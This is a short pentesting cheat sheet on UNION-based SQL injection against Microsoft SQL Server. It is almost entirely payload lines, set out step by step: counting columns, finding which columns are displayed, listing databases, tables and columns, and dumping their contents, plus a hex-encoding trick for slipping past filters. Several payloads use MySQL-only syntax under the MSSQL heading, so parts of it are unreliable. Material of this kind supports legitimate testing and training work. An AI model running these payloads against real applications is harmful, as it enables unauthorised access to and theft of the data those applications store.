# MSSQL Injection

## UNION Based

### Step 1. Number of columns

```bash
# First method:
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' etc.
# Second method:
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
# etc.
```

### Step 2. List columns on the web

```bash
' UNION SELECT 'a',NULL,NULL,NULL-- -
' UNION SELECT NULL,'a',NULL,NULL-- -
' UNION SELECT NULL,NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,NULL,'a'-- -
```

### Step 3. DB version and show databases

{% hint style="danger" %}
Remember to use a column where the result is displayed.
{% endhint %}

```sql
# DB version:
' UNION SELECT @@version, NULL-- - # For MySQL and Microsoft.
'# DBs:
## View the name of the current database.
' UNION SELECT database(), NULL-- -
'## Names of all databases:
' union select schema_name, NULL from information_schema.schemata-- -
' union select (select group_concat(SCHEMA_NAME SEPARATOR '\n') FROM information_schema.schemata),2,3-- -
## We are changing the limit: limit 0,1 - limit 1,1 - limit 2,1:
' union select schema_name, NULL from information_schema.schemata limit 0,1-- -
```

### Step 4. Tables and columns

```sql
# Tables:
## View all tables in all databases:
' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables-- -
'
## To see all the tables of all the databases (indicates me to which DB belongs that table):
' UNION select table_name,table_schema, NULL,NULL,NULL from INFORMATION_SCHEMA.TABLES-- -
' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='<NAME DB>'-- -
' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema="<NAME DB>" limit 0,1-- - # Vamos cambiando el limit: limit 0,1 - limit 1,1 - limit 2,1
'
## Bypass in hexadecimal:
echo -n "School" | xxd -ps
... where table_schema=0x5363686f6f6c-- -

# Columns:
' UNION SELECT column_name, NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name="<TABLE NAME>" limit 0,1-- -
' UNION SELECT column_name, NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_schema="<DATABASE NAME>" and table_name="<TABLE NAME>" limit 0,1-- -
```

### Step 5. Dump info

```sql
' UNION SELECT <COLUMN NAME>,NULL,NULL,NULL,NULL FROM <TABLE NAME>-- -
' UNION SELECT <COLUMN NAME>+':'+<COLUMN NAME>,NULL,NULL,NULL,NULL FROM <TABLE NAME>-- -
```

## References

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/MSSQL Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
